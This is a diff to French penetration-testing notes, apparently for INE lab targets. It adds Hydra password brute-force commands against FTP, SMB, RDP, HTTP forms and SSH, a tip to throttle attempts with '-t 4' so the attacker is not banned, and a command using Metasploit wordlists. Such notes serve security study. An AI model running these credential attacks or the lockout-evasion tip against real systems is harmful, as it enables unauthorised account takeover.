@@ -6,10 +6,11 @@ http# Mysql
 `ftp <IP-TARGET>`
 
 # HYDRA  
-`hydra [options] -L (ou -l) liste_users -P liste_mdp ftp://IP_ou_Domaine`  
-`hydra -L users.txt -P passwords.txt smb://target1.ine.local`
-`hydra -L users.txt -P passwords.txt rdp://target1.ine.local`
-`hydra -L users.txt -P passwords.txt target1.ine.local http-post-form \`
+`hydra [options] -L (ou -l) liste_users -P liste_mdp ftp://IP_ou_Domaine` il est nécessaire de rajouter `-t 4` pour ralentir la vitesse en ftp pour ne pas être banni.  
+* `hydra -L users.txt -P passwords.txt smb://target1.ine.local`
+* `hydra -L users.txt -P passwords.txt rdp://target1.ine.local`
+* `hydra -L users.txt -P passwords.txt target1.ine.local http-post-form \`  
+* `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt -t 4 demo.ine.local ssh`  
 
 -l = un seul nom d’utilisateur
 -L = un fichier contenant plusieurs noms d’utilisateur
